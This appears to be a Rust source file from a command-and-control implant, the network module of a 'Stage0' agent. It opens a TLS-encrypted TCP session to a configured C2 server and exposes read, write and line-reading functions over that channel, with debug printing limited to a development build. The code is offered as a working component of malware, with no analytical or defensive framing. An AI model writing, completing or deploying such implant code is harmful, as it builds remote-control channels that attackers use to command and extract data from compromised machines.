//! Network session management for Stage0
//!
//! Handles TLS session establishment with the C2 server

use crate::config::{get_c2_server, SessionConfig};
use std::error::Error;
use std::io::{BufReader, Read, Write};
use std::net::TcpStream;
use std::sync::Arc;

use rustls::{ClientConfig, ClientConnection, StreamOwned};
use webpki_roots::TLS_SERVER_ROOTS;

/// Active session with C2 server
pub struct Session {
    stream: StreamOwned<ClientConnection, TcpStream>,
}

impl Session {
    /// Creates a new session
    pub fn new(stream: StreamOwned<ClientConnection, TcpStream>) -> Self {
        Self { stream }
    }

    /// Reads data from the session
    pub fn read(&mut self, buf: &mut [u8]) -> Result<usize, Box<dyn Error>> {
        Ok(self.stream.read(buf)?)
    }

    /// Writes data to the session
    pub fn write(&mut self, buf: &[u8]) -> Result<(), Box<dyn Error>> {
        self.stream.write_all(buf)?;
        self.stream.flush()?;
        Ok(())
    }

    /// Reads a line from the session
    pub fn read_line(&mut self) -> Result<String, Box<dyn Error>> {
        let mut line = String::new();
        let mut reader = BufReader::new(&mut self.stream);
        
        use std::io::BufRead;
        reader.read_line(&mut line)?;
        
        Ok(line)
    }
}

/// Establishes a TLS session with the C2 server
///
/// This reuses the same TLS configuration as the main agent
/// for consistency and compatibility
///
/// # Returns
///
/// * `Ok(Session)` - Active encrypted session
/// * `Err(_)` - Failed to establish session
pub fn establish_session() -> Result<Session, Box<dyn Error>> {
    let _config = SessionConfig::default();
    let server = get_c2_server();

    #[cfg(feature = "dev")]
    println!("[NETWORK] Establishing TLS session with {}", server);

    // Parse server address
    let parts: Vec<&str> = server.split(':').collect();
    if parts.len() != 2 {
        return Err("Invalid server address format".into());
    }
    
    let hostname = parts[0];
    let _port = parts[1];

    // Create TLS configuration
    let tls_config = create_tls_config()?;

    // Connect to server
    #[cfg(feature = "dev")]
    println!("[NETWORK] Connecting to {}...", server);
    
    let tcp_stream = TcpStream::connect(server)?;
    tcp_stream.set_nodelay(true)?;

    // Establish TLS connection
    let server_name = rustls::pki_types::ServerName::try_from(hostname.to_string())?;
    let client_conn = ClientConnection::new(Arc::new(tls_config), server_name)?;
    let tls_stream = StreamOwned::new(client_conn, tcp_stream);

    #[cfg(feature = "dev")]
    println!("[NETWORK] TLS session established");

    Ok(Session::new(tls_stream))
}

/// Creates TLS client configuration
///
/// Uses the same configuration as the main agent:
/// - TLS 1.2 and 1.3
/// - System root certificates
/// - No client certificates
fn create_tls_config() -> Result<ClientConfig, Box<dyn Error>> {
    let mut root_store = rustls::RootCertStore::empty();
    
    // Add system root certificates
    for cert in TLS_SERVER_ROOTS.iter() {
        root_store.roots.push(cert.clone());
    }

    let config = ClientConfig::builder()
        .with_root_certificates(root_store)
        .with_no_client_auth();

    Ok(config)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_create_tls_config() {
        let config = create_tls_config();
        assert!(config.is_ok());
    }
}
